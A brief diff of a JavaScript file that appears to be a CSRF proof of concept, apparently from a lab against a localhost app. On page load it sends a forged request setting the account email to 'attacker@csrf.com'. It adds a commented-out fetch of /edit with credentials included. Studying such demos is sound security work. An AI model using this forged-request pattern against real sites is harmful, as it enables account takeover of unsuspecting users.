@@ -10,4 +10,10 @@ window.addEventListener('load', () => {
         },
         body: 'email=attacker@csrf.com'
     })
+
+    // fetch('http://localhost:5000/edit', {
+        // credentials: 'include',
+    // })
+        // .then(res => res.text())
+        // .then(html => console.log(html))
 })
